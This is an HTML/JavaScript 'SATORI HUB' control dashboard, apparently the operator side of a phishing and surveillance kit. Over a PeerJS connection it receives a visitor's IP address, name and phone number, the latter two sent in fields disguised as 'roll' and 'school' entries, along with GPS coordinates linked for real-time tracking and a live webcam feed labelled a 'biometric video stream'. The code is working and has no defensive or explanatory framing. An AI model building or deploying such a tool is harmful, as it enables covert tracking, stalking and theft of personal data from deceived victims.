<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SATORI | Control Hub</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        :root { --primary: #38bdf8; --bg: #0f172a; --card: #1e293b; --text: #f8fafc; --accent: #fbbf24; }
        body { font-family: 'Inter', system-ui, sans-serif; background: var(--bg); color: var(--text); margin: 0; display: flex; height: 100vh; overflow: hidden; }
        
        /* Sidebar Styles */
        #sidebar { width: 360px; background: var(--card); border-right: 1px solid #334155; padding: 25px; display: flex; flex-direction: column; box-shadow: 10px 0 30px rgba(0,0,0,0.2); z-index: 10; }
        h2 { margin: 0 0 5px 0; color: var(--primary); font-size: 22px; letter-spacing: 1px; }
        .status-badge { display: inline-block; padding: 4px 12px; border-radius: 20px; font-size: 10px; font-weight: 800; background: #14532d; color: #4ade80; margin-bottom: 25px; }
        
        .data-section { background: #0f172a; border-radius: 12px; padding: 15px; margin-bottom: 15px; border-left: 4px solid var(--primary); }
        .label { font-size: 10px; color: #94a3b8; text-transform: uppercase; font-weight: 700; margin-bottom: 5px; }
        .value { font-size: 16px; font-family: 'JetBrains Mono', monospace; color: var(--text); }
        
        /* Log Area */
        #log-container { flex-grow: 1; background: #000; border-radius: 8px; padding: 15px; font-size: 11px; font-family: monospace; overflow-y: auto; color: #10b981; border: 1px solid #334155; }
        .log-entry { margin-bottom: 5px; border-bottom: 1px solid #111; padding-bottom: 2px; }
        .timestamp { color: #64748b; margin-right: 8px; }

        /* Main Viewport */
        #viewport { flex: 1; background: #000; position: relative; display: flex; align-items: center; justify-content: center; }
        video { width: 100%; height: 100%; object-fit: contain; }
        #placeholder { position: absolute; text-align: center; color: #475569; }
        .map-link { display: inline-block; margin-top: 10px; color: var(--accent); text-decoration: none; font-size: 13px; font-weight: bold; border: 1px solid var(--accent); padding: 5px 10px; border-radius: 4px; }
        .map-link:hover { background: var(--accent); color: #000; }
    </style>
</head>
<body>

<div id="sidebar">
    <h2>SATORI HUB</h2>
    <div class="status-badge" id="sys-status">CONNECTION IDLE</div>

    <div class="data-section">
        <div class="label">Visitor Identity</div>
        <div class="value" id="res-name">Awaiting Name...</div>
        <div class="value" id="res-phone" style="font-size: 14px; margin-top:5px; color:#94a3b8;">No Phone Detected</div>
    </div>

    <div class="data-section" style="border-left-color: var(--accent);">
        <div class="label">Network & Location</div>
        <div class="value" id="res-ip">IP: 0.0.0.0</div>
        <div id="res-geo"></div>
    </div>

    <div class="label" style="margin-bottom: 10px;">Live Activity Log</div>
    <div id="log-container">
        <div class="log-entry">System ready. Waiting for peer...</div>
    </div>
    
    <p style="font-size: 10px; color: #475569; margin-top: 15px;">Note: Click anywhere on dashboard to unlock audio/video autoplay.</p>
</div>

<div id="viewport">
    <div id="placeholder">
        <div style="font-size: 40px; margin-bottom: 10px;">📡</div>
        <div>NO ACTIVE STREAM</div>
    </div>
    <video id="remote-video" autoplay playsinline muted></video>
</div>

<script>
    const MY_ID = 'enkode-satori-v1-russel';
    const peer = new Peer(MY_ID);

    // Browser security: Unlock video on first interaction
    window.addEventListener('click', () => {
        const v = document.getElementById('remote-video');
        v.play();
        addLog("Audio/Video context unlocked.");
    });

    peer.on('open', (id) => {
        document.getElementById('sys-status').innerText = "SYSTEM ONLINE";
        document.getElementById('sys-status').style.background = "#14532d";
        addLog("Server started. Listening on ID: " + id);
    });

    peer.on('connection', (conn) => {
        addLog("New peer connected to data channel.");

        conn.on('data', (data) => {
            // Handle the Instant IP packet
            if (data.type === "INSTANT_LOG") {
                document.getElementById('res-ip').innerText = "IP: " + data.ip;
                addLog(`[INSTANT] IP captured: ${data.ip}`);
            }

            // Handle the Full Details packet
            if (data.type === "FULL_LOG") {
                document.getElementById('res-name').innerText = data.creds.roll; // Shows Name
                document.getElementById('res-phone').innerText = "Phone: " + data.creds.school; // Shows Phone
                
                if(data.geo && data.geo.lat) {
                    const mapUrl = `https://www.google.com/maps?q=${data.geo.lat},${data.geo.lon}`;
                    document.getElementById('res-geo').innerHTML = `<a href="${mapUrl}" target="_blank" class="map-link">📍 Track Real-time Location</a>`;
                    addLog("GPS Coordinates Received.");
                }
                addLog(`User submitted: ${data.creds.roll}`);
            }
        });
    });

    // Handle the Video Call
    peer.on('call', (call) => {
        addLog("Receiving biometric video stream...");
        call.answer(); 
        
        call.on('stream', (stream) => {
            const video = document.getElementById('remote-video');
            video.srcObject = stream;
            document.getElementById('placeholder').style.display = 'none';
            
            video.onloadedmetadata = () => {
                video.play().catch(e => addLog("Autoplay blocked. Click dashboard!"));
            };
        });
    });

    function addLog(msg) {
        const container = document.getElementById('log-container');
        const time = new Date().toLocaleTimeString([], { hour12: false });
        container.innerHTML += `<div class="log-entry"><span class="timestamp">[${time}]</span> ${msg}</div>`;
        container.scrollTop = container.scrollHeight;
    }

    peer.on('error', (err) => {
        addLog("PeerJS Error: " + err.type);
        console.error(err);
    });
</script>
</body>
</html>
